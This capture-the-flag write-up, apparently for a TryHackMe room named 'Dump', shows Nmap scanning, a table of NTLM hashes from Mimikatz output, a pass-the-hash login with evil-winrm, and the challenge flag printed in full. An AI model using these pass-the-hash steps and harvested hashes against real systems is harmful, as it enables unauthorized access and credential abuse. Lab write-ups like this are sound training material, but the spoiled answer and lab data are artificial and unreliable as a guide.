# Dump

## Challenge Description
> ![image](https://github.com/user-attachments/assets/c775c523-203b-4fdc-8e67-9491bd3df4c0)

## Solution
To identify open ports and services running on the target machine, we executed an Nmap scan:
```
$ nmap -p 5985,5986 -sC -sV 10.10.250.160
```
Scan result:
```
PORT     STATE  SERVICE VERSION
5985/tcp open   http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp closed wsmans
```

The scan revealed that WinRM (Windows Remote Management) is enabled on port 5985, which can be exploited for remote access if valid credentials are available.

The document contains **Mimikatz** output with authentication details. The usernames, domains, passwords, and NTLM hashes are extracted and tablulated as shown below:

| Username         | Domain      | NTLM Hash                            |
|-----------------|------------|----------------------------------------|
| **ByteReaper**  | DUMP       | 43034346035d7a24b1eaa1c82acaef3e       |
| **NullPhantom** | DUMP       | 75b216fc8d12fbd0124d0c0865118e4d       |
| **specter**     | DUMP       | 2c3e48bac1b65c52fc0fb0cd70eaf3aa       |
| **Cipher**      | DUMP       | 6786c31df90f9568d4ca2480affeea9a       |
| **Administrator** | DUMP     | 2dfe3378335d43f9764e581b856a662a       |
| **ShadowPacket** | DUMP      | 5fe2eb8c75c48179bce6025e70859e47       |
| **GhostTrace**   | DUMP      | 4820e4687d0ed2845328aa492dc0b33c       |
| **DarkInjector** | DUMP      | 3a659a65d9c16d40a28684995782458f       |

Since **WinRM** is open and we have NTLM hashes, we leveraged Pass-the-Hash authentication using **Evil-WinRM**.
```
evil-winrm -i 10.10.250.160 -u <username> -H <NTLM hash>
```

After trying all the credentials, it was found that the credentials of **DarkInjector** were able to gain access to Administrator directory:

```
evil-winrm -i 10.10.250.160 -u DarkInjector -H 3a659a65d9c16d40a28684995782458f
```

Upon successful connection, we gained a PowerShell session on the target machine.

After gaining a foothold, we explored the user directories to identify valuable files.
```
cd C:\Users
ls
```

Output:
```
Directory: C:\Users

Mode                LastWriteTime         Name
----                -------------         ----
d-----         3/3/2025   1:40 AM          Administrator
d-----         3/3/2025   8:47 PM          ByteReaper
d-----         3/3/2025   8:35 PM          Cipher
d-----         3/3/2025   2:03 PM          DarkInjector
d-----         3/3/2025   8:48 PM          GhostTrace
d-----         3/3/2025   8:47 PM          NullPhantom
d-r---       12/12/2018   7:45 AM          Public
d-----         3/3/2025   8:48 PM          ShadowPacket
d-----         3/3/2025   8:44 PM          specter
```

We navigated to the Administrator directory, suspecting it contained high-value files.
```
cd Administrator
ls
```
Output:

![image](https://github.com/user-attachments/assets/8f895a3c-8571-45cf-a117-d612fb801279)

Navigating each directory and finally, the Desktop directory contained a flag file.

![image](https://github.com/user-attachments/assets/0de0124f-f201-4c5b-ba53-12e3bcca4ea9)

Finally, we retrieved the flag by reading the flag.txt file: 
```
cat flag.txt
```

![image](https://github.com/user-attachments/assets/f5fcaf1d-eb70-4ee4-9a38-1e11b567bd06)

## Conclusion

By leveraging WinRM, Evil-WinRM, and Pass-the-Hash authentication, we successfully gained remote access to the target machine. We navigated through the file system, located the flag, and completed the challenge.

## Flag: 
THM{1nj3ctBr34k3r5}

   
